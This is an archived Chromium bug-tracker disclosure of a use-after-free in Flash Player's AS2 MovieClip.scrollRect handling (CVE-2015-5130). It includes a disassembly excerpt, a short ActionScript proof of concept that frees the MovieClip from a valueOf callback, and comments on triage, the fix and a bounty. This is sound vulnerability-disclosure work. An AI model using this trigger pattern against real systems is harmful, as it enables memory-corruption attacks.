# Security: Flash UAF with MovieClip.scrollRect in AS2

| Field | Value |
|-------|-------|
| **Issue ID** | [40081965](https://issues.chromium.org/issues/40081965) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2015-5130 |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-04-29 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

When setting the scrollRect attribute of a MovieClip in AS2 with a custom Rectangle it is possible to free the MovieClip while a reference remains  

in the stack

**VERSION**  

Chrome Version: Chrome stable 42.0.2311.90, Flash 17.0.0.169  

Operating System: [Win 7 SP1]

**REPRODUCTION CASE**  

That code targets the MovieClip.scrollRect property. While setting this attribute with a custom Rectangle, it is possible to trigger a use after free by freeing the targeted MovieClip. Creating a TextField with the same depth of the targeted MovieClip is enough to free an object and have Flash crash.

These lines come from flashplayer standalone 17.0.0.169:

.text:00597F45 loc\_597F45:  

.text:00597F45 cmp eax, 6  

.text:00597F48 jnz loc\_597FE5  

.text:00597F4E mov ecx, esi ; esi points to the MovieClip object  

.text:00597F50 call sub\_40C1ED  

.text:00597F55 add eax, 30Ch  

.text:00597F5A or dword ptr [eax], 8  

.text:00597F5D mov eax, [ebx]  

.text:00597F5F mov byte ptr [eax+82Ch], 1  

.text:00597F66 mov ecx, [ebx]  

.text:00597F68 lea eax, [ebp+74h+var\_1C0]  

.text:00597F6E push eax  

.text:00597F6F push dword ptr [ebx+0Ch]  

.text:00597F72 call xfetchRectangleProperties ; get the Rectangle properties, and execute some AS2  

.text:00597F77 test al, al  

.text:00597F79 jz loc\_598274  

.text:00597F7F mov edi, [ebp+74h+var\_1C0]  

.text:00597F85 mov ecx, esi  

.text:00597F87 imul edi, 14h  

.text:00597F8A call sub\_40C1ED ; reference freed memory and return a bad

pointer  

.text:00597F8F mov [eax+310h], edi ; crash here, eax = 0

Poc (compile with Flash CS5.5):

import flash.geom.Rectangle  

var o2 = {}  

o2.valueOf = function () {  

\_global.mc.createTextField("newtf",1,1,1,2,3)  

return 7  

}  

var o = {x:o2,y:0,width:4,height:5}

\_global.mc = this  

var newmc:MovieClip = this.createEmptyMovieClip("newmc",1)  

newmc.scrollRect = o

## Attachments

- [flash_mc_uaf.zip](attachments/flash_mc_uaf.zip) (application/zip, 5.8 KB)
- [sploit.zip](attachments/sploit.zip) (application/zip, 12.3 KB)

## Timeline

### [Deleted User] (2015-04-30)

Can someone from Adobe please look into this?

### sc...@gmail.com (2015-04-30)

I'll triage this and file it with Adobe PSIRT if necessary.

### [Deleted User] (2015-04-30)

[Empty comment from Monorail migration]

### pa...@google.com (2015-05-01)

[Empty comment from Monorail migration]

### la...@google.com (2015-05-01)

[Empty comment from Monorail migration]

### [Deleted User] (2015-05-01)

@laforge - Thanks for the CC.  :)
@scarybeasts - It would be ideal if this came in through Adobe PSIRT.

### [Deleted User] (2015-05-01)

Yeah, I also see NULL crash, even on x64. I trust you that it's a UaF, of course, but I think a repro that demos it's possible to get a non-NULL crash might impress the rewards panel more ;-)

### bi...@gmail.com (2015-05-04)

I'd say "it's possible to get a non-NULL crash" ;-). Chrome 42.0.2311.135 32-bit on Win7 SP1 (x64 and x86).

### sc...@gmail.com (2015-05-04)

https://www.youtube.com/watch?v=WvIRsDHFiis

### bi...@gmail.com (2015-05-04)

^^. Stopped at 1.15 though ;)

### sc...@gmail.com (2015-05-05)

This is PSIRT-3645.

### cp...@chromium.org (2015-06-05)

[Empty comment from Monorail migration]

### bi...@gmail.com (2015-08-20)

Fixed in https://helpx.adobe.com/security/products/flash-player/apsb15-19.html, CVE-2015-5130

### ti...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-09)

$7500 for this report as well - congratulations!

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### cl...@chromium.org (2015-12-02)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/482521?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081965)*
